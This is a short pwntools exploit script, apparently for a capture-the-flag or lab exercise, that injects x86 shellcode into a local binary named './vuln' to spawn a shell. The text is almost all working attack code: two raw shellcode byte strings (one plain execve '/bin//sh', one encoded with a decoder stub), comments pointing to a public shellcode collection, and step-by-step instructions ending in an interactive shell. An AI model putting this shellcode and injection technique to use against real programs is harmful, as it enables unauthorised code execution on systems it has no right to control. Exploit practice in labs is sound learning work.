#So here the way is to either use shellcode generated
#by the pwn library through shellcraft or find one already made
#on the site http://shell-storm.org/shellcode/.

#Steps:
#1. find or create some shellcode
#2. it needs to be translated in assembly form if alredy not(\x...)
#3. then you have to pass it to the program, and it will store it in the variable
#4. BOOM! you have spawned a shell

#!/bin/python3

from pwn import *

#shellcode = asm(shellcraft.i386.sh())
shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
shellcode1 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
print(shellcode)

p = process("./vuln")
p.sendline(shellcode1)
p.interactive()
